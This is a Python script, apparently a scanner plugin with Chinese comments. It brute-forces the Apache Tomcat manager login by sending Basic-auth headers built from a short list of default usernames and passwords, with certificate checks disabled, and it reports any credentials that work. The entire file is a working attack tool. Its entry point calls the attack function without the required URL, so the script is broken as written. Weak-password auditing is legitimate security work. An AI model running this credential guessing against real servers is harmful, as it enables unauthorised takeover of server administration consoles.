# -*- coding: utf-8 -*-
import requests
import base64

'''
Usage:
    moon.py -u  tomcat http://127.0.0.1:8080
    爆破tomcat用户名账户密码。
'''

def attack(URL):
    print('[+]开始检测-Tomcat-weak_pawsswd漏洞。[+]')
    #设定用于爆破的账户密码
    accounts = ['admin','tomcat']
    passwds = ['123456','1234','12345678','admin','tomcat']
    for account in accounts:
        for passwd in passwds:
            txt = account+':'+passwd
            encodestr = base64.b64encode(txt.encode('utf-8'))#使用base64加密爆破字符串
            encodestr = str(encodestr, 'utf-8')#将 b'' 这类的东西去掉
            url = URL + '/manager/html'
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
            Authorization = f'Basic {encodestr}'
            headers = {"User-Agent": user_agent,"Authorization":Authorization}
            try:
                r = requests.get(url,headers=headers, verify=False)
                if r.status_code == 200:
                    print('[+]发现弱口令'+Authorization)
                elif r.status_code == 401:
                    print('账户密码错误：',txt)
                else:
                    print('[-]爆破密码出错。')
            except:
                print('[-]访问管理页面出错')
    print('[+]检测结束-Tomcat-weak_pawsswd漏洞。[+]')

if __name__ == "__main__":
    attack()
